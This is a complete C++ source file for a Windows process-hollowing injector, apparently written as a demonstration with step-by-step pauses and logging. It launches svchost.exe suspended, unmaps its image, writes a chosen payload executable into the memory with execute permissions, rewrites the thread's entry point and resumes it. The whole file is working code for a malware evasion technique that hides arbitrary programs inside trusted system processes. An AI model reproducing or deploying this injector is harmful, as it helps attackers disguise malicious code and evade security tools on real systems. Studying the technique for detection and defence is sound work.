#include <iostream>
#include <conio.h>
#include <sstream>
#include <windows.h>
#include <winternl.h>

using namespace std;

string processPATH = "C:\\Windows\\System32\\svchost.exe";
string payloadPATH = "helloworld.exe";

struct AppConfig{
    bool autoMode = false;
    bool showHelp = false;

    AppConfig(){}
    AppConfig(int argc, char* argv[]){
        for (int i = 1; i < argc; i++) {
            string arg = argv[i];

            if (arg == "-h" || arg == "--help") 
                showHelp = true;
            else if (arg == "-a" || arg == "--auto")
                autoMode = true;
            else if (arg == "-pa" || arg == "--patha"){
                if (i + 1 < argc) 
                    processPATH = argv[++i];
            }
            else if (arg == "-pb" || arg == "--pathb"){
                if (i + 1 < argc)  
                    payloadPATH = argv[++i];
            }
        }
    }

    void printHelp() const {
        std::cout << "Usage: ./app [options]\n\n"
                  << "Options:\n"
                  << "  -h, --help      Show this help message\n"
                  << "  -a, --auto      Enable automatic processing without user prompt (default: false)\n"
                  << "  -pa <path>      Specify path for process (default: " << processPATH << ")\n"
                  << "  -pb <path>      Specify path for payload (default: " << payloadPATH << ")\n";
    }
};

AppConfig config;

typedef NTSTATUS (NTAPI* _NtQueryInformationProcess)(
    HANDLE           ProcessHandle,
    PROCESSINFOCLASS ProcessInformationClass,
    PVOID            ProcessInformation,
    ULONG            ProcessInformationLength,
    PULONG           ReturnLength
);

typedef NTSTATUS (NTAPI* _NtUnmapViewOfSection)(
    HANDLE           ProcessHandle,
    PVOID            BaseAddress
);

HANDLE hFile;
HANDLE hMapObject;
LPVOID pSourceImage;

PIMAGE_DOS_HEADER dosHeader;
PIMAGE_NT_HEADERS32 ntHeader;
PIMAGE_SECTION_HEADER sectionHeader;

IMAGE_OPTIONAL_HEADER32 optionalHeader;
IMAGE_FILE_HEADER fileHeader;

STARTUPINFOA start_info;
PROCESS_INFORMATION proc_info;

int info_no = 1;
void Pause(){
    if (config.autoMode)
        return;
    cout << "\033[34m Press any key to continue... \033[0m" << endl;
    _getch();
    cout << "\33[A\33[2K" << "\r" << flush;
}
void LogInfo(string text, string value){
    cout << "\033[1;34m INFO \033[0m " << text << " \033[33m" << value << "\033[0m" << endl;
}
void LogNoti(string text){
    cout << "\033[1;43;30m NOTI \033[0m " << "\033[2m" << to_string(info_no++) << ". " << text << "\033[0m" << endl;
}
void LogError(string text){
    cout << "\033[1;41;30m ERROR \033[0m " << "\033[1;31m" << text << "\033[0m" << endl;
    Pause();
    LogInfo("Last error code:", to_string(GetLastError()));
    LogNoti("Terminating process...");

    TerminateProcess(proc_info.hProcess, 0);

    CloseHandle(proc_info.hThread);
    CloseHandle(proc_info.hProcess);
}
void LogSuccess(string text){
    cout << "\033[1;32m" << text << "\033[0m" << endl;
}

string GetAddress(PVOID ptr){
    stringstream ss;
    ss << ptr;
    return ss.str();
}

bool GetFileInfo(){
    LogNoti("Getting payload info...");
    LogInfo("Payload path", payloadPATH);

    hFile = CreateFileA(
        payloadPATH.c_str(),
        GENERIC_READ,
        FILE_SHARE_READ,
        NULL,
        OPEN_EXISTING,
        FILE_ATTRIBUTE_NORMAL,
        NULL
    );
    if (hFile == INVALID_HANDLE_VALUE){
        LogError("CreateFile failed");
        return 0;
    }
    hMapObject = CreateFileMappingA(hFile, NULL, PAGE_READONLY, 0, 0, NULL);
    pSourceImage = MapViewOfFile(hMapObject,FILE_MAP_READ,0,0,0);

    dosHeader = (PIMAGE_DOS_HEADER)pSourceImage;
    ntHeader = (PIMAGE_NT_HEADERS32)((BYTE*)pSourceImage + ((PIMAGE_DOS_HEADER)pSourceImage)->e_lfanew);
    sectionHeader = IMAGE_FIRST_SECTION(ntHeader);

    optionalHeader = ntHeader->OptionalHeader;
    fileHeader = ntHeader->FileHeader;
    
    if (dosHeader->e_magic != IMAGE_DOS_SIGNATURE){
        LogError("Given file is not DOS file");
        return 0;
    }

    return 1;
}

bool CreateProcess(){
    LogNoti("Creating process...");
    LogInfo("Process path", processPATH);

    start_info = {0}; 
    start_info.cb = sizeof(STARTUPINFOA);  
    proc_info = {0};

    if (!CreateProcessA(
        processPATH.c_str(),
        NULL,
        NULL,
        NULL,
        FALSE,
        CREATE_SUSPENDED,
        NULL,
        NULL,
        &start_info,
        &proc_info
    )){
        LogError("CreateProcess failed");
        return 0;
    }

    LogInfo("Process PID", to_string(proc_info.dwProcessId));
    return 1;
}

_NtQueryInformationProcess f_NtQueryInformationProcess;
_NtUnmapViewOfSection f_NtUnmapViewOfSection;

bool LoadNTDLLFunctions(){
    LogNoti("Loading NTDLL...");

    HMODULE ntdll = GetModuleHandleA("ntdll.dll");
    FARPROC pNtQueryInformationProcess = GetProcAddress(
        ntdll,
        "NtQueryInformationProcess"
    );
    if (!pNtQueryInformationProcess){
        LogError("Failed to load ntdll.dll function");
        return 0;
    }
    f_NtQueryInformationProcess = (_NtQueryInformationProcess)pNtQueryInformationProcess;

    FARPROC pNtUnmapViewOfSection = GetProcAddress(
        ntdll,
        "NtUnmapViewOfSection"
    );
    if (!pNtUnmapViewOfSection){
        LogError("Failed to load ntdll.dll function");
        return 0;
    }
    f_NtUnmapViewOfSection = (_NtUnmapViewOfSection)pNtUnmapViewOfSection;

    return 1;
}

PPEB pPEB;
bool GetProcessPEB(){
    LogNoti("Getting PEB...");
    PROCESS_BASIC_INFORMATION proc_baseinfo = {};
    f_NtQueryInformationProcess(
        proc_info.hProcess,
        ProcessBasicInformation,
        &proc_baseinfo,
        sizeof(PROCESS_BASIC_INFORMATION),
        NULL
    );

    pPEB = (PPEB)proc_baseinfo.PebBaseAddress;
    if (!pPEB){
        LogError("Error getting PEB");
        return 0;
    }

    LPCONTEXT pContext = new CONTEXT();
    pContext->ContextFlags = CONTEXT_ALL;

    if (!GetThreadContext(proc_info.hThread, pContext)){
        LogError("Error getting context");
        return 0;
    }

    LogInfo("PEB at address", GetAddress(pPEB));
    return 1;
}

PVOID pImageBase;
bool GetImageBase(){
    LogNoti("Getting image base...");
    ReadProcessMemory(
        proc_info.hProcess,
        (LPCVOID)((BYTE*)pPEB + 0x8),
        &pImageBase,
        8,
        NULL
    );
    if (!pImageBase){
        LogError("Error getting image base");
        return 0;
    }
    LogInfo("Image base at address", GetAddress(pImageBase));
    return 1;
}

bool HollowProcess(){
    LogNoti("Hollowing process...");
    DWORD dwResult = f_NtUnmapViewOfSection(
        proc_info.hProcess,
        pImageBase
    );
    if (dwResult){
        LogError("Error unmapping section");
        return 0;
    }
    return 1;
}

bool AllocateMemory(){
    LogNoti("Allocating memory...");
    LogInfo("Image size", to_string(optionalHeader.SizeOfImage));
    LPVOID pRemoteImageBase = VirtualAllocEx(
        proc_info.hProcess,
        pImageBase,
        optionalHeader.SizeOfImage,
        MEM_COMMIT | MEM_RESERVE,
        PAGE_EXECUTE_READWRITE
    );
    if (!pRemoteImageBase){
        LogError("VirtualAllocEx failed");
        return 0; 
    }
    return 1;
}

bool CopySourceImage(){
    LogNoti("Copying source image to memory...");
    LogNoti("Writing headers...");
    
    if (!WriteProcessMemory(
        proc_info.hProcess,
        pImageBase,
        pSourceImage,
        optionalHeader.SizeOfHeaders,
        NULL
    ))
    {
        LogError("Error writing process headers");
        return 0;
    }
        
    for (int i = 0; i < fileHeader.NumberOfSections; i++){
        PVOID destination = (PVOID)((BYTE*)pImageBase + sectionHeader[i].VirtualAddress); 
        PVOID pSourceSection = (PVOID)((BYTE*)pSourceImage + sectionHeader[i].PointerToRawData);
        LogInfo("Writing \033[33m" + string(sectionHeader[i].Name, sectionHeader[i].Name + 8) + "\033[0m to", GetAddress(destination));

        if (!WriteProcessMemory(
            proc_info.hProcess,
            destination,
            pSourceSection,
            sectionHeader[i].SizeOfRawData, 
            NULL
        ))
        {
            LogError("Error writing process section");
            return 0;
        }
    }
    return 1;
}

bool SetThreadContext(){
    LogNoti("Setting thread context...");
    
    LPCONTEXT pContext = new CONTEXT();
    pContext->ContextFlags = CONTEXT_INTEGER;
    
    if (!GetThreadContext(proc_info.hThread, pContext)){
        LogError("Error getting context");
        return 0;
    }
    DWORD dwEntrypoint = (DWORD)pImageBase + optionalHeader.AddressOfEntryPoint;
    LogInfo("Old entry point", GetAddress((PVOID)pContext->Eax));
    LogInfo("New entry point", GetAddress((PVOID)dwEntrypoint));
    
    pContext->Eax = dwEntrypoint;			
    if (!SetThreadContext(proc_info.hThread, pContext)){
        LogError("Error setting context");
        return 0;
    }
    return 1;
}

int main(int argc, char* argv[]){
    config = AppConfig(argc, argv);
    if (config.showHelp) {
        config.printHelp();
        return 0;
    }

    if (!GetFileInfo()) {return 0;}
    if (!CreateProcess()) {return 0;}
    if (!LoadNTDLLFunctions()) {return 0;}
    if (!GetProcessPEB()) {return 0;}
    if (!GetImageBase()) {return 0;} Pause();
    if (!HollowProcess()) {return 0;} Pause();
    if (!AllocateMemory()) {return 0;} Pause();
    if (!CopySourceImage()) {return 0;} Pause();
    if (!SetThreadContext()) {return 0;} Pause();

    LogSuccess("All done! Resuming thread...");
    if (!ResumeThread(proc_info.hThread)){
        LogError("Failed to resume (Crashed?)");
        return 0;
    }

    LogNoti("Waiting for payload is finished...");
    WaitForSingleObject(proc_info.hProcess, INFINITE);

    DWORD exitCode = 0;
    GetExitCodeProcess(proc_info.hProcess, &exitCode);
    LogInfo("Payload exit code", to_string(exitCode));

    CloseHandle(proc_info.hThread);
    CloseHandle(proc_info.hProcess);
}